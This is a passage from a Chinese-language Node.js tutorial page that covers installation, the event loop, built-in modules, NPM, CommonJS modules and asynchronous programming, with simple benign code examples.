<li><a href="#631-%E4%BD%BF%E7%94%A8-ejs">6.3.1 使用 EJS</a></li>
<li><a href="#632-%E4%BD%BF%E7%94%A8-handlebars">6.3.2 使用 Handlebars</a></li>
<li><a href="#633-%E4%BD%BF%E7%94%A8-pug">6.3.3 使用 Pug</a></li>
</ul>
</li>
</ul>
<h2 id="7-测试与调试"><a href="#7-测试与调试" class="headerlink" title="7. 测试与调试"></a>7. 测试与调试</h2><ul>
<li><p><a href="#71-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E4%B8%8E%E9%9B%86%E6%88%90%E6%B5%8B%E8%AF%95">7.1 单元测试与集成测试</a></p>
<ul>
<li><a href="#711-%E4%BD%BF%E7%94%A8-mocha-%E8%BF%9B%E8%A1%8C%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95">7.1.1 使用 Mocha 进行单元测试</a></li>
<li><a href="#712-%E4%BD%BF%E7%94%A8-chai-%E8%BF%9B%E8%A1%8C%E6%96%AD%E8%A8%80">7.1.2 使用 Chai 进行断言</a></li>
<li><a href="#713-%E6%B5%8B%E8%AF%95%E5%BC%82%E6%AD%A5%E4%BB%A3%E7%A0%81">7.1.3 测试异步代码</a></li>
</ul>
</li>
<li><p><a href="#72-%E8%B0%83%E8%AF%95-nodejs-%E5%BA%94%E7%94%A8">7.2 调试 Node.js 应用</a></p>
<ul>
<li><a href="#721-%E4%BD%BF%E7%94%A8-consolelog-%E8%B0%83%E8%AF%95">7.2.1 使用 <code>console.log</code> 调试</a></li>
<li><a href="#722-%E4%BD%BF%E7%94%A8-nodejs-%E5%86%85%E7%BD%AE%E8%B0%83%E8%AF%95%E5%99%A8">7.2.2 使用 <code>Node.js</code> 内置调试器</a></li>
<li><a href="#723-%E4%BD%BF%E7%94%A8-vs-code-%E8%B0%83%E8%AF%95-nodejs-%E5%BA%94%E7%94%A8">7.2.3 使用 <code>VS Code</code> 调试 Node.js 应用</a></li>
</ul>
</li>
</ul>
<h2 id="8-部署与性能优化"><a href="#8-部署与性能优化" class="headerlink" title="8. 部署与性能优化"></a>8. 部署与性能优化</h2><ul>
<li><p><a href="#81-%E9%83%A8%E7%BD%B2-nodejs-%E5%BA%94%E7%94%A8">8.1 部署 Node.js 应用</a></p>
<ul>
<li><a href="#811-%E4%BD%BF%E7%94%A8-pm2-%E8%BF%9B%E8%A1%8C%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86">8.1.1 使用 <code>PM2</code> 进行进程管理</a></li>
<li><a href="#812-docker-%E9%83%A8%E7%BD%B2-nodejs-%E5%BA%94%E7%94%A8">8.1.2 Docker 部署 Node.js 应用</a></li>
<li><a href="#813-%E5%9C%A8%E4%BA%91%E5%B9%B3%E5%8F%B0%E4%B8%8A%E9%83%A8%E7%BD%B2-nodejs">8.1.3 在云平台上部署 Node.js</a></li>
</ul>
</li>
<li><p><a href="#82-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E4%B8%8E%E7%BC%93%E5%AD%98">8.2 性能优化与缓存</a></p>
<ul>
<li><a href="#821-%E4%BD%BF%E7%94%A8-redis-%E7%BC%93%E5%AD%98">8.2.1 使用 Redis 缓存</a></li>
<li><a href="#822-%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96%E4%B8%8E%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6">8.2.2 内存优化与垃圾回收</a></li>
<li><a href="#823-%E4%BD%BF%E7%94%A8%E9%9B%86%E7%BE%A4%E6%A8%A1%E5%BC%8F%E6%8F%90%E9%AB%98%E6%80%A7%E8%83%BD">8.2.3 使用集群模式提高性能</a></li>
</ul>
</li>
</ul>
<h2 id="9-安全性"><a href="#9-安全性" class="headerlink" title="9. 安全性"></a>9. 安全性</h2><ul>
<li><p><a href="#91-%E5%AE%89%E5%85%A8%E6%80%A7%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5">9.1 安全性最佳实践</a></p>
<ul>
<li><a href="#911-%E9%98%B2%E6%AD%A2%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">9.1.1 防止注入攻击</a></li>
<li><a href="#912-%E9%98%B2%E6%AD%A2%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-xss">9.1.2 防止跨站脚本攻击 (XSS)</a></li>
<li><a href="#913-%E4%BD%BF%E7%94%A8-helmetjs-%E4%BF%9D%E6%8A%A4%E5%BA%94%E7%94%A8">9.1.3 使用 <code>helmet.js</code> 保护应用</a></li>
</ul>
</li>
<li><p><a href="#92-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83">9.2 身份验证与授权</a></p>
<ul>
<li><a href="#921-%E4%BD%BF%E7%94%A8-jwt-%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81">9.2.1 使用 JWT 进行身份验证</a></li>
<li><a href="#922-oauth-%E4%B8%8E%E7%AC%AC%E4%B8%89%E6%96%B9%E7%99%BB%E5%BD%95%E9%9B%86%E6%88%90">9.2.2 OAuth 与第三方登录集成</a></li>
</ul>
</li>
<li><p><a href="#93-ssl-%E4%B8%8E-https">9.3 SSL 与 HTTPS</a></p>
<ul>
<li><a href="#931-%E7%94%9F%E6%88%90%E4%B8%8E%E9%85%8D%E7%BD%AE-ssl-%E8%AF%81%E4%B9%A6">9.3.1 生成与配置 SSL 证书</a></li>
<li><a href="#932-%E4%BD%BF%E7%94%A8-https-%E6%A8%A1%E5%9D%97">9.3.2 使用 <code>https</code> 模块</a></li>
</ul>
</li>
</ul>
<h2 id="10-实战项目"><a href="#10-实战项目" class="headerlink" title="10. 实战项目"></a>10. 实战项目</h2><ul>
<li><p><a href="#101-%E6%9E%84%E5%BB%BA-restful-api">10.1 构建 RESTful API</a></p>
<ul>
<li><a href="#1011-restful-api-%E5%9F%BA%E7%A1%80">10.1.1 RESTful API 基础</a></li>
<li><a href="#1012-%E4%BD%BF%E7%94%A8-express-%E6%9E%84%E5%BB%BA-api">10.1.2 使用 Express 构建 API</a></li>
</ul>
</li>
<li><p><a href="#102-%E5%AE%9E%E7%8E%B0-websocket-%E9%80%9A%E4%BF%A1">10.2 实现 WebSocket 通信</a></p>
<ul>
<li><a href="#1021-websocket-%E5%9F%BA%E7%A1%80">10.2.1 WebSocket 基础</a></li>
<li><a href="#1022-%E4%BD%BF%E7%94%A8-ws-%E5%AE%9E%E7%8E%B0-websocket-%E6%9C%8D%E5%8A%A1">10.2.2 使用 <code>ws</code> 实现 WebSocket 服务</a></li>
</ul>
</li>
<li><p><a href="#103-%E4%BD%BF%E7%94%A8-graphql-%E6%9E%84%E5%BB%BA-api">10.3 使用 GraphQL 构建 API</a></p>
<ul>
<li><p><a href="#1031-graphql-%E6%A6%82%E8%BF%B0">10.3.1 GraphQL 概述</a></p>
</li>
<li><p><a href="#1032-%E4%BD%BF%E7%94%A8-apollo-server-%E6%9E%84%E5%BB%BA-graphql-api">10.3.2 使用 Apollo Server 构建 GraphQL API</a></p>
</li>
</ul>
</li>
</ul>
<h3 id="1-1-什么是-Node-js"><a href="#1-1-什么是-Node-js" class="headerlink" title="1.1 什么是 Node.js"></a>1.1 什么是 Node.js</h3><p>Node.js 是一个基于 <strong>Chrome V8 JavaScript 引擎</strong> 构建的 JavaScript 运行环境。它允许开发者使用 JavaScript 编写后端代码，因此前后端可以共享同一种语言。Node.js 主要用于开发网络服务器、实时应用程序、命令行工具等，具有以下特点：</p>
<ul>
<li><strong>事件驱动</strong>：Node.js 的事件驱动架构使其能够高效地处理并发连接。</li>
<li><strong>异步非阻塞 I&#x2F;O</strong>：通过异步处理，Node.js 可以在不阻塞程序执行的情况下处理 I&#x2F;O 操作（文件系统、网络请求等）。</li>
<li><strong>单线程模型</strong>：尽管 Node.js 是单线程的，但它通过事件循环和异步编程支持高并发处理。</li>
</ul>
<h3 id="1-2-Node-js-安装与配置"><a href="#1-2-Node-js-安装与配置" class="headerlink" title="1.2 Node.js 安装与配置"></a>1.2 Node.js 安装与配置</h3><h4 id="1-2-1-在不同平台上安装-Node-js"><a href="#1-2-1-在不同平台上安装-Node-js" class="headerlink" title="1.2.1 在不同平台上安装 Node.js"></a>1.2.1 在不同平台上安装 Node.js</h4><ul>
<li><strong>Windows</strong>：访问 <a target="_blank" rel="noopener" href="https://nodejs.org/">Node.js 官网</a> 下载适合你的安装包，并运行安装程序。</li>
<li><strong>macOS</strong>：使用 Homebrew 安装：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install node<br></code></pre></td></tr></table></figure></li>
<li><strong>Linux</strong>：通过包管理器安装：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install nodejs npm<br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="1-2-2-验证安装"><a href="#1-2-2-验证安装" class="headerlink" title="1.2.2 验证安装"></a>1.2.2 验证安装</h4><p>在终端中输入以下命令，确保 Node.js 和 npm 安装成功：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">node -v<br>npm -v<br></code></pre></td></tr></table></figure>

<h3 id="1-3-Node-js-运行机制与事件循环"><a href="#1-3-Node-js-运行机制与事件循环" class="headerlink" title="1.3 Node.js 运行机制与事件循环"></a>1.3 Node.js 运行机制与事件循环</h3><p>Node.js 使用 <strong>事件驱动</strong> 和 <strong>非阻塞 I&#x2F;O 模型</strong> 来处理高并发。它基于 <strong>单线程</strong> 处理所有的请求，通过事件循环管理异步操作。</p>
<h4 id="1-3-1-事件循环的工作原理"><a href="#1-3-1-事件循环的工作原理" class="headerlink" title="1.3.1 事件循环的工作原理"></a>1.3.1 事件循环的工作原理</h4><p>事件循环是 Node.js 的核心，它允许 Node.js 处理异步 I&#x2F;O 操作而不阻塞主线程。每次异步操作被注册到事件循环中，当 I&#x2F;O 操作完成时，相关的回调函数会被放入任务队列，等待事件循环调度执行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Start&#x27;</span>);<br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Inside Timeout&#x27;</span>);<br>&#125;, <span class="hljs-number">1000</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;End&#x27;</span>);<br><br><span class="hljs-comment">// 输出顺序：</span><br><span class="hljs-comment">// Start</span><br><span class="hljs-comment">// End</span><br><span class="hljs-comment">// Inside Timeout</span><br></code></pre></td></tr></table></figure>

<h3 id="1-4-Node-js-与-JavaScript-的区别"><a href="#1-4-Node-js-与-JavaScript-的区别" class="headerlink" title="1.4 Node.js 与 JavaScript 的区别"></a>1.4 Node.js 与 JavaScript 的区别</h3><p>Node.js 和 JavaScript 都使用同样的语言语法，但它们的运行环境和使用场景不同：</p>
<ul>
<li><strong>JavaScript</strong> 主要运行在浏览器中，用于操控 DOM 和处理前端交互。</li>
<li><strong>Node.js</strong> 运行在服务器端，用于构建后端应用程序和处理 I&#x2F;O 操作。</li>
</ul>
<p>Node.js 提供了许多 JavaScript 在浏览器中没有的模块，如 <code>fs</code> (文件系统模块)、<code>http</code> (HTTP 模块)、<code>net</code> (网络模块) 等。</p>
<hr>
<h2 id="2-模块与包管理-1"><a href="#2-模块与包管理-1" class="headerlink" title="2. 模块与包管理"></a>2. 模块与包管理</h2><h3 id="2-1-Node-js-内置模块"><a href="#2-1-Node-js-内置模块" class="headerlink" title="2.1 Node.js 内置模块"></a>2.1 Node.js 内置模块</h3><p>Node.js 提供了一系列内置模块，允许开发者处理常见的任务，如文件操作、网络请求等。</p>
<h4 id="2-1-1-fs-文件系统模块"><a href="#2-1-1-fs-文件系统模块" class="headerlink" title="2.1.1 fs 文件系统模块"></a>2.1.1 <code>fs</code> 文件系统模块</h4><p><code>fs</code> 模块用于处理文件系统的操作，包括读取、写入文件和管理文件夹。</p>
<p><strong>读取文件：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="2-1-2-http-模块"><a href="#2-1-2-http-模块" class="headerlink" title="2.1.2 http 模块"></a>2.1.2 <code>http</code> 模块</h4><p><code>http</code> 模块用于创建 HTTP 服务器和处理请求&#x2F;响应。</p>
<p><strong>创建简单的 HTTP 服务器：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, World!\n&#x27;</span>);<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server is running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="2-1-3-path-模块"><a href="#2-1-3-path-模块" class="headerlink" title="2.1.3 path 模块"></a>2.1.3 <code>path</code> 模块</h4><p><code>path</code> 模块用于处理和规范化文件路径。</p>
<p><strong>获取文件的扩展名：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-keyword">const</span> ext = path.<span class="hljs-title function_">extname</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ext); <span class="hljs-comment">// 输出: .txt</span><br></code></pre></td></tr></table></figure>

<h4 id="2-1-4-os-模块"><a href="#2-1-4-os-模块" class="headerlink" title="2.1.4 os 模块"></a>2.1.4 <code>os</code> 模块</h4><p><code>os</code> 模块提供与操作系统相关的实用函数和属性。</p>
<p><strong>获取系统的内存信息：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;os&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Total Memory: <span class="hljs-subst">$&#123;os.totalmem()&#125;</span> bytes`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Free Memory: <span class="hljs-subst">$&#123;os.freemem()&#125;</span> bytes`</span>);<br></code></pre></td></tr></table></figure>

<h4 id="2-1-5-crypto-模块"><a href="#2-1-5-crypto-模块" class="headerlink" title="2.1.5 crypto 模块"></a>2.1.5 <code>crypto</code> 模块</h4><p><code>crypto</code> 模块提供了加密操作的功能，用于生成哈希、加密和解密数据。</p>
<p><strong>生成 SHA256 哈希：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> hash = crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>).<span class="hljs-title function_">update</span>(<span class="hljs-string">&#x27;password&#x27;</span>).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash);<br></code></pre></td></tr></table></figure>

<h3 id="2-2-使用-NPM-和包管理"><a href="#2-2-使用-NPM-和包管理" class="headerlink" title="2.2 使用 NPM 和包管理"></a>2.2 使用 NPM 和包管理</h3><p>NPM 是 Node.js 的包管理器，允许开发者安装、管理和分享第三方库。</p>
<h4 id="2-2-1-NPM-的安装和使用"><a href="#2-2-1-NPM-的安装和使用" class="headerlink" title="2.2.1 NPM 的安装和使用"></a>2.2.1 NPM 的安装和使用</h4><p>在安装 Node.js 时，NPM 会自动安装。你可以使用以下命令检查是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm -v<br></code></pre></td></tr></table></figure>

<h4 id="2-2-2-管理项目依赖"><a href="#2-2-2-管理项目依赖" class="headerlink" title="2.2.2 管理项目依赖"></a>2.2.2 管理项目依赖</h4><p><strong>安装依赖包：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install express<br></code></pre></td></tr></table></figure>

<p><strong>卸载依赖包：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm uninstall express<br></code></pre></td></tr></table></figure>

<h4 id="2-2-3-版本控制与语义化版本"><a href="#2-2-3-版本控制与语义化版本" class="headerlink" title="2.2.3 版本控制与语义化版本"></a>2.2.3 版本控制与语义化版本</h4><p>NPM 使用语义化版本控制 (SemVer)，版本号格式为 <code>MAJOR.MINOR.PATCH</code>：</p>
<ul>
<li><strong>MAJOR</strong>：有重大更改或破坏兼容性时增加。</li>
<li><strong>MINOR</strong>：添加新功能但不破坏兼容性时增加。</li>
<li><strong>PATCH</strong>：修复 bug 且不破坏兼容性时增加。</li>
</ul>
<h4 id="2-2-4-使用-package-json-管理项目"><a href="#2-2-4-使用-package-json-管理项目" class="headerlink" title="2.2.4 使用 package.json 管理项目"></a>2.2.4 使用 <code>package.json</code> 管理项目</h4><p><code>package.json</code> 是 Node.js 项目配置文件，用于定义项目的依赖、脚本、版本号等。</p>
<p><strong>生成 <code>package.json</code> 文件：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm init<br></code></pre></td></tr></table></figure>

<p><strong>示例 <code>package.json</code> 文件：</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-app&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1.0.0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;start&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;node app.js&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;dependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;express&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^4.17.1&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<h3 id="2-3-自定义模块与-CommonJS-规范"><a href="#2-3-自定义模块与-CommonJS-规范" class="headerlink" title="2.3 自定义模块与 CommonJS 规范"></a>2.3 自定义模块与 CommonJS 规范</h3><h4 id="2-3-1-导入与导出模块"><a href="#2-3-1-导入与导出模块" class="headerlink" title="2.3.1 导入与导出模块"></a>2.3.1 导入与导出模块</h4><p>Node.js 遵循 <strong>CommonJS 模块规范</strong>，通过 <code>module.exports</code> 导出模块，通过 <code>require</code> 导入模块。</p>
<p><strong>导出模块：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// file: math.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">add</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b;<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">subtract</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a - b;<br></code></pre></td></tr></table></figure>

<p><strong>导入模块：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./math&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>));  <span class="hljs-comment">// 输出: 5</span><br></code></pre></td></tr></table></figure>

<h4 id="2-3-2-CommonJS-和-ES6-模块的区别"><a href="#2-3-2-CommonJS-和-ES6-模块的区别" class="headerlink" title="2.3.2 CommonJS 和 ES6 模块的区别"></a>2.3.2 CommonJS 和 ES6 模块的区别</h4><ul>
<li><strong>CommonJS</strong> 是 Node.js 的默认模块系统，使用 <code>require</code> 和 <code>module.exports</code>。</li>
<li><strong>ES6 模块</strong> 使用 <code>import</code> 和 <code>export</code> 语法，在 Node.js 中也逐渐被支持，需要在 <code>package.json</code> 中添加 <code>&quot;type&quot;: &quot;module&quot;</code>。</li>
</ul>
<hr>
<h2 id="3-异步编程-1"><a href="#3-异步编程-1" class="headerlink" title="3. 异步编程"></a>3. 异步编程</h2><h3 id="3-1-异步编程基础"><a href="#3-1-异步编程基础" class="headerlink" title="3.1 异步编程基础"></a>3.1 异步编程基础</h3><p>Node.js 的异步编程是其核心特点，允许程序在执行耗时任务时继续处理其他任务。</p>
<h4 id="3-1-1-回调函数"><a href="#3-1-1-回调函数" class="headerlink" title="3.1.1 回调函数"></a>3.1.1 回调函数</h4><p>回调函数是最基础的异步处理方式，将一个函数作为参数传递给另一个函数，在异步任务完成后调用该回调函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="3-1-2-Promise-对象"><a href="#3-1-2-Promise-对象" class="headerlink" title="3.1.2 Promise 对象"></a>3.1.2 <code>Promise</code> 对象</h4><p><code>Promise</code> 是一种更现代的异步处理方式，可以避免回调地狱问题。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-property">promises</span>;<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err));<br></code></pre></td></tr></table></figure>

<h4 id="3-1-3-async-await-语法"><a href="#3-1-3-async-await-语法" class="headerlink" title="3.1.3 async/await 语法"></a>3.1.3 <code>async/await</code> 语法</h4><p><code>async/await</code> 是基于 <code>Promise</code> 的语法糖，能够以同步的写法处理异步任务。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-property">promises</span>;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">readFile</span>(<span class="hljs-params"></span>) &#123;<br> <br><br> <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">readFile</span>();<br></code></pre></td></tr></table></figure>

<h3 id="3-2-事件驱动编程"><a href="#3-2-事件驱动编程" class="headerlink" title="3.2 事件驱动编程"></a>3.2 事件驱动编程</h3><p>Node.js 的事件驱动编程通过 <strong>事件循环</strong> 和 <strong>事件发射器</strong> (<code>EventEmitter</code>) 实现。</p>
<h4 id="3-2-1-使用-EventEmitter"><a href="#3-2-1-使用-EventEmitter" class="headerlink" title="3.2.1 使用 EventEmitter"></a>3.2.1 使用 <code>EventEmitter</code></h4><p><code>EventEmitter</code> 是 Node.js 的核心类，用于创建和监听事件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">EventEmitter</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;events&#x27;</span>);<br><span class="hljs-keyword">const</span> emitter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventEmitter</span>();<br><br>emitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;event&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span 